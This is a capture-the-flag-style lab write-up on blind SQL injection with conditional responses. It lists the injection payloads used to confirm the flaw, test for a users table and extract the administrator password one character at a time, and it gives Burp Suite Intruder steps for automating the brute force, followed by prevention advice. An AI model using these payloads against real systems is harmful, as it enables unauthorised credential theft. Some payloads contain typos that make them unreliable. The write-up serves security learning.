# 🔐 Lab 11: Blind SQL Injection with Conditional Responses

 Blind SQL - Attackers infer the data by analyzing server response such as Content changes, Time delays.

## 🧩 Objective
Enumerate the password of the administrator and login as a administrator.

## 🔍 Vulnerability
The application is vulnerable to SQL Injection, but it does not display query results directly. Instead, it shows different responses based on the evaluation of injected conditions.

## ⚙️ Payload Used
- ' AND 1=1--  
- ' AND 1=0--
- ' AND (SELECT username from users WHERE username = 'administrator' AND LENGTH(password)>20 ) = 'administrator'--
- ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--  

## 🔎 Detailed Analysis
1. Confirm that parameter is vulnerable to blind SQL injection.
- SELECT tracking_id FROM tracking_table WHERE tracking_id = 'abc'
  
  ->If the tracking_id exists -> query returns value -> "welcome back message"
  
  ->If the tracking_d doesn't exists -> Query returns nathing -> No welcome message
  
- SELECT tracking_id FROM tracking_table WHERE tracking_id = 'abc' AND 1=1 --
 
  ->True -> Welcome back message
  
- select tracking_id from tracking_table where tracking_id = 'abc' and 1=0 --
  
  ->Flase -> NO Welcome back message
  
2. Confirm that we have a user table
- ' AND (SELECT 'x' from users LIMIT 1) = 'x'--
  
   ->users table exists in the user table
  
3. Confirm that username administrator exists user table
-  ' AND SELECT username from users WHERE username = 'administrator' ) = 'administrator'--

    ->username administrator exist in the user table
4. Enumerate the password of the administrtor user
- ' AND (SELECT username from users WHERE username = 'administrator' AND LENGTH(password)>20 ) = 'administrator'--

   ->password is exaclty 20 charaters
-  ' AND (SELECT SUBSTRING(password, 1,1) FROM uers WHERE username='administrator')='a'--

     ->It check the password starting char 'a'
   
## 🚀 Steps to Reproduce
1. Navigate to the vulnerable page  
2. Intercept the request using Burp Suite  
3. Send the request to Repeater  
4. Test injection:
   ' AND 1=1--  
   ' AND 1=2--  
5. Observe difference in responses  
6. Extract password using:
   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--  
7. Steps to use INTRUDER in BURP Suite
   1. To know password length(send the request to intruder)
      - Go to position
        - Clear all the position(which positiion you want patch, patch it and click Add button
        - set Attack type - Snipper
      - Payloads
         - payloads type : Number(set this)
         - payload option mark sequestial from from 1 to 50 and step count set 1
      - Click on Start Attack
      - Go to Result and check different length column and analyze response by message
    2. To Know exact password(send the request to intruder)
       - Go to position
         - Clear all the position(which positiion you want patch, patch it and click Add button
         - set Attack type - Snipper
       - Go to Payloads
         - payloads type : Brute force(set this)
         - payload option mark count 1
       - Click on Start Attack
       - Go to Result and check different length column and analyze response by message
    3. Using two payload
       - Go to position
         - Clear all the position(which positiion you want patch, patch it and click Add button
         - set Attack type - Cluster bomb
       - Go to Payloads
         - set two different payload, based on the what you perform.
       - Click on Start Attack
       - Analyze the result
       - To know the password order  the character which are displayed in the result in the serial number.
             
         
## ✅ Result
Successfully extracted the administrator password using Blind SQL Injection.

## 🧠 Key Learning
Blind SQL Injection allows data extraction even when query results are not directly visible, by analyzing application behavior.

## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Implement strict input validation  
- Avoid dynamic SQL queries  
- Use proper error handling  

---

